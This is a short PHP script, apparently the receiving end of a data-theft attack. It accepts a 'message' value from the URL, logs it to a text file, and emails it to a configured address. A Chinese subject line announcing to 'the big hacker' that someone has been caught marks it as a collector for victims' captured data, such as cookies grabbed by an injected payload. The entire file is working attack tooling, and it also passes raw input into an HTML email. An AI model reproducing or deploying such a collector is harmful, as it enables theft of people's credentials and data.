<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require '../vendor/phpmailer/phpmailer/src/Exception.php';
require '../vendor/phpmailer/phpmailer/src/PHPMailer.php';
require '../vendor/phpmailer/phpmailer/src/SMTP.php';
$config = include 'config.php';



if ($_GET['message']) {
    $message = $_GET['message'];
    // Get the current date and time
    $timestamp = date('Y-m-d H:i:s');
    // Concatenate the message with the timestamp
    $message_info = "[$timestamp] $message\n";
    // Write the message to the file
    file_put_contents('messages.txt', $message_info, FILE_APPEND);
    $name = $config['name'];
    $email = $config['email'];
    $mail = new PHPMailer(true);

    try {
        // Server settings
        // 是否启用smtp的debug进行调试 开发环境建议开启 生产环境注释掉即可 默认关闭debug调试模式
        $mail->SMTPDebug = 1;
        $mail->isSMTP();                                            // Send using SMTP

        $mail->Host       = $config['smtp_server'];              // Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                // Enable SMTP authentication
        $mail->Username   = $config['email'];                    // SMTP username
        $mail->Password   = $config['password'];                 // SMTP password
        // 设置使用ssl加密方式登录鉴权
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port       = $config['smtp_port'];                 // TCP port to connect to

        // 设置发送的邮件的编码
        $mail->CharSet = 'UTF-8';

        // 设置发件人昵称 显示在收件人邮件的发件人邮箱地址前的发件人姓名
        $mail->FromName = '邮件使魔';

        // Recipients
        // 设置发件人邮箱地址 同登录账号
        $mail->From = $config['email'] ;

        $mail->addAddress($config['email'], 'Recipient');     // Add a recipient
        // 添加该邮件的主题
        $mail->Subject = '报告大黑客,有人中招啦`';
        // Content
        $mail->isHTML(true);                                  // Set email format to HTML
        $mail->Body    = $message;
        // 发送邮件 返回状态
        $status = $mail->send();
        echo 'Message has been sent !!!'.$status;
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>